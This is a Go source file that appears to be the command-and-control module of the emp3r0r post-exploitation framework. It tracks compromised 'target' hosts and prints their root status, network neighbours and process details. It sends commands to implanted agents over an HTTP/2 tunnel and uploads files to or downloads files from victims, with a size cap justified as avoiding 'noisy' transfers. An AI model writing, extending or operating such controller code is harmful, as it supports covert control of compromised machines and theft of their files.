package cc

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"strings"

	"github.com/fatih/color"
	"github.com/jm33-m0/emp3r0r/core/internal/agent"
	"github.com/jm33-m0/emp3r0r/core/internal/tun"
	"github.com/posener/h2conn"
)

var (
	// DebugLevel what kind fof logs do we want to see
	// 0 (INFO) -> 1 (WARN) -> 2 (ERROR)
	DebugLevel = 0

	// EmpRoot root directory of emp3r0r
	EmpRoot, _ = os.Getwd()

	// Targets target list, with control (tun) interface
	Targets = make(map[*agent.SystemInfo]*Control)
)

const (
	// Temp where we save temp files
	Temp = "/tmp/emp3r0r/"

	// WWWRoot host static files for agent
	WWWRoot = Temp + tun.FileAPI

	// FileGetDir where we save #get files
	FileGetDir = Temp + "file-get/"
)

// Control controller interface of a target
type Control struct {
	Index int
	Conn  *h2conn.Conn
}

// ListTargets list currently connected agents
func ListTargets() {
	color.Cyan("Connected agents\n")
	color.Cyan("=================\n\n")

	indent := strings.Repeat(" ", len(" [0] "))
	for target, control := range Targets {
		userInfo := color.HiRedString(target.User)
		hasInternet := color.HiRedString("NO")
		if target.HasRoot {
			userInfo = color.HiGreenString(target.User)
		}
		if target.HasInternet {
			hasInternet = color.HiGreenString("YES")
		}

		// split long lines
		splitLongLine := func(line string, titleLen int) (ret string) {
			if len(line) < 55 {
				return line
			}
			ret = line[:55]
			for i := 1; i <= len(line)/55; i++ {
				if i == 2 {
					break
				}
				endslice := 55 * (i + 1)
				if endslice >= len(line) {
					endslice = len(line)
				}
				ret += fmt.Sprintf("\n%s%s", strings.Repeat(" ", 25-titleLen), line[55*i:endslice])
			}

			return
		}
		arpTab := splitLongLine(strings.Join(target.ARP, ", "), 3)
		ips := splitLongLine(strings.Join(target.IPs, ", "), 3)

		// agent process info
		agentProc := target.Process
		procInfo := fmt.Sprintf("PID: %s (%d), PPID: %s (%d)",
			agentProc.Cmdline, agentProc.PID, agentProc.Parent, agentProc.PPID)

		// info map
		infoMap := map[string]string{
			"Hostname":  color.HiCyanString(target.Hostname),
			"Process":   color.HiMagentaString(procInfo),
			"User":      userInfo,
			"Internet":  hasInternet,
			"CPU":       color.HiMagentaString(target.CPU),
			"MEM":       target.Mem,
			"Hardware":  color.HiCyanString(target.Hardware),
			"Container": target.Container,
			"OS":        color.HiWhiteString(target.OS),
			"Kernel":    color.HiBlueString(target.Kernel) + ", " + color.HiWhiteString(target.Arch),
			"From":      color.HiYellowString(target.IP) + fmt.Sprintf(" - %s", color.HiGreenString(target.Transport)),
			"IPs":       color.BlueString(ips),
			"ARP":       color.HiWhiteString(arpTab),
		}

		// print
		fmt.Printf(" [%s] Tag: %s", color.CyanString("%d", control.Index), strings.Repeat(" ", (14-len("Tag")))+
			color.CyanString(target.Tag))

		for key, val := range infoMap {
			fmt.Printf("\n%s%s:%s%s", indent, key, strings.Repeat(" ", (15-len(key))), val)
		}
		fmt.Print("\n\n\n\n")
	}
}

// GetTargetFromIndex find target from Targets via control index
func GetTargetFromIndex(index int) (target *agent.SystemInfo) {
	for t, ctl := range Targets {
		if ctl.Index == index {
			target = t
			break
		}
	}
	return
}

// GetTargetFromTag find target from Targets via tag
func GetTargetFromTag(tag string) (target *agent.SystemInfo) {
	for t := range Targets {
		if t.Tag == tag {
			target = t
			break
		}
	}
	return
}

// ListModules list all available modules
func ListModules() {
	CliPrettyPrint("Module Name", "Help", &agent.ModuleDocs)
}

// Send2Agent send MsgTunData to agent
func Send2Agent(data *agent.MsgTunData, agent *agent.SystemInfo) (err error) {
	ctrl := Targets[agent]
	if ctrl == nil {
		return errors.New("Send2Agent: Target is not connected")
	}
	out := json.NewEncoder(ctrl.Conn)

	err = out.Encode(data)
	return
}

// PutFile put file to agent
func PutFile(lpath, rpath string, a *agent.SystemInfo) error {
	// open and read the target file
	f, err := os.Open(lpath)
	if err != nil {
		CliPrintError("PutFile: %v", err)
		return err
	}
	bytes, err := ioutil.ReadAll(f)
	if err != nil {
		CliPrintError("PutFile: %v", err)
		return err
	}

	// file sha256sum
	sum := sha256.Sum256(bytes)

	// file size
	size := len(bytes)
	sizemB := float32(size) / 1024 / 1024
	if sizemB > 20 {
		return errors.New("please do NOT transfer large files this way as it's too NOISY, aborting")
	}
	CliPrintInfo("\nPutFile:\nUploading '%s' to\n'%s' "+
		"on %s, agent [%d]\n"+
		"size: %d bytes (%.2fmB)\n"+
		"sha256sum: %x",
		lpath, rpath,
		a.IP, Targets[a].Index,
		size, sizemB,
		sum,
	)

	// base64 encode
	payload := base64.StdEncoding.EncodeToString(bytes)

	fileData := agent.MsgTunData{
		Payload: "FILE" + agent.OpSep + rpath + agent.OpSep + payload,
		Tag:     a.Tag,
	}

	// send
	err = Send2Agent(&fileData, a)
	if err != nil {
		CliPrintError("PutFile: %v", err)
		return err
	}
	return nil
}

// GetFile get file from agent
func GetFile(filepath string, a *agent.SystemInfo) error {
	var data agent.MsgTunData
	cmd := fmt.Sprintf("#get %s", filepath)
	CliPrintWarning("Check %s%s for downloaded file", FileGetDir, filepath)

	data.Payload = fmt.Sprintf("cmd%s%s", agent.OpSep, cmd)
	data.Tag = a.Tag
	err := Send2Agent(&data, a)
	if err != nil {
		CliPrintError("GetFile: %v", err)
		return err
	}
	return nil
}
